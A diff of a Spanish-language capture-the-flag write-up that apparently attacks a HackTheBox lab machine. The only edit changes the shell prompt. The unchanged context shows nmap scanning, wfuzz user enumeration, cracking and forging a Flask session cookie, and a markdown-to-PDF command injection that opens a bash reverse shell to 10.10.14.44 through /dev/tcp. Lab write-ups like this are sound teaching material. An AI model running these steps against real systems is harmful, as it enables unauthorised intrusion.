@@ -44,7 +44,7 @@ image:
 ## Fase de enumeración
 Iniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:
 ```shell
-❯ nmap -sCV -oN scope.txt 10.10.11.160
+rabb1t@hold:~$ nmap -sCV -oN scope.txt 10.10.11.160
 Nmap scan report for 10.10.11.160
 Not shown: 997 closed tcp ports (conn-refused)
 PORT     STATE SERVICE VERSION
@@ -64,7 +64,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con `Werkzeug`.
 Intentemos conectarnos a través de `ftp` como `anonymous` con una contraseña vacía:
 ```shell
-❯ ftp 10.10.11.160
+rabb1t@hold:~$ ftp 10.10.11.160
 Connected to 10.10.11.160.
 220 (vsFTPd 3.0.3)
 Name (10.10.11.160:$(USER)): anonymous
@@ -98,7 +98,7 @@ Inspeccionando un poco más, nos encontramos algo con lo que podemos jugar: un _
 
 Veamos qué contiene al pasarlo a esta [web](https://jwt.io/) o también podemos decodear la primer parte del Token desde consola:
 ```shell
-❯ echo 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9' | base64 -d | jq
+rabb1t@hold:~$ echo 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9' | base64 -d | jq
 
 {
   "logged_in": true,
@@ -112,7 +112,7 @@ Veamos qué contiene al pasarlo a esta [web](https://jwt.io/) o también podemos
 Anteriormente en el intento de acceder usando credenciales por defecto, vimos el mensaje de error `Invalid credentials`. Cuando usamos el usuario que registramos (`test123`) con una contraseña errónea, aparece el mensaje `Ìnvalid login`, así que tenemos una vía potencial de enumerar usuarios. Denodo a lo anterior usaré `wfuzz` —también podríamos crear un script en python para el mismo fin—:
 
 ```shell
-❯ wfuzz -c --ss 'Invalid login' -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.160:5000/login
+rabb1t@hold:~$ wfuzz -c --ss 'Invalid login' -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.160:5000/login
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -138,7 +138,7 @@ El formato de datos lo podemos ver en la petición que mandamos al intentar ingr
 Lo importante: obtuvimos un usuario, `blue` ¿Y ahora qué? Bueno, haciendo una búsqueda por internet o más bien en la "Biblia", [hacktricks](https://book.hacktricks.xyz), nos encontramos con algo que nos puede ayudar a [crackear](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) el `secreto` del `JWT`:
 
 ```shell
-❯ flask-unsign --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU' --no-literal-eval
+rabb1t@hold:~$ flask-unsign --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU' --no-literal-eval
 [*] Session decodes to: {'logged_in': True, 'username': 'test123'}
 [*] Starting brute-forcer with 8 threads..
 [+] Found secret key after 18048 attempts
@@ -147,7 +147,7 @@ b'secret123'
 
 Ahora que tenemos el secreto `secret123`, podemos construir nuestro propio `JWT` para conectarnos con el usuario `blue`:
 ```shell
-❯ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
+rabb1t@hold:~$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxEq4Q.mqsQtRYlhrqrq2hkn604WPY2PLY
 ```
 
@@ -167,7 +167,7 @@ ftp_admin
 ## Accediendo a ftp como blue
 ¡Ahora tenemos credenciales para acceder por ftp! Cuando accedemos obtenemos lo siguiente:
 ```shell
-❯ ftp 10.10.11.160 
+rabb1t@hold:~$ ftp 10.10.11.160 
 Connected to 10.10.11.160.
 220 (vsFTPd 3.0.3)
 Name (10.10.11.160:$(USER)): blue
@@ -191,7 +191,7 @@ ftp>
 ## Accediendo a ftp como ftp_admin
 Sabiendo lo anterior, podemos intentar acceder como el usuario `admin` siguiendo la política:
 ```shell
-❯ ftp 10.10.11.160
+rabb1t@hold:~$ ftp 10.10.11.160
 Connected to 10.10.11.160.
 220 (vsFTPd 3.0.3)
 Name (10.10.11.160:rabb1t0xf): ftp_admin
@@ -301,21 +301,21 @@ Además, vemos que `md-to-pdf.js` se ejecuta con _NodeJS_. Haciendo una búsqued
 
 Creamos un archivo malicioso:
 ```shell
-❯ echo "--';bash -i >& /dev/tcp/10.10.14.44/4433 0>&1;'--" > rev.md 
+rabb1t@hold:~$ echo "--';bash -i >& /dev/tcp/10.10.14.44/4433 0>&1;'--" > rev.md 
 ```
 
 Levantamos un servidor con python:
 ```shell
-❯ python3 -m http.server
+rabb1t@hold:~$ python3 -m http.server
 ```
 Y en otra ventana debemos ponernos en "escucha" con `netcat` en el puerto que específicamos dentro del archivo malicioso, `4433`:
 ```shell
-❯ netcat -lnvp 4433
+rabb1t@hold:~$ netcat -lnvp 4433
 ```
 
 Y en el campo _URL_ ponemos lo siguiente `http://10.10.14.44:8000/rev.md` (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente). Presionamos en `exportar` y obtenemos una conexión remota: 
 ```shell
-❯ netcat -lnvp 4433
+rabb1t@hold:~$ netcat -lnvp 4433
 Listening on 0.0.0.0 4433
 Connection received on 10.10.11.160 49170
 bash: cannot set terminal process group (1261): Inappropriate ioctl for device
